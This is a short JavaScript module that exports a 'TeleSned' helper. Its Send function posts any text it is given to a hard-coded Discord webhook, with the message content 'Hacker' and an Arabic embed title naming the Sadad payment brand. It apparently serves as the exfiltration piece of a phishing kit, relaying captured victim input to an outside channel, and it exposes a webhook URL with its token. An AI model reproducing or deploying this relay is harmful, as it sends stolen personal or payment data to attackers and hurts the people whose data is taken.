import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1322985637670031411/Zir43lmdh8M_OgU_Bx5DHXP0QGUOlvmJOg_xqgOrLaufXrW0fwtAlUekgiPPVZGteD86",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
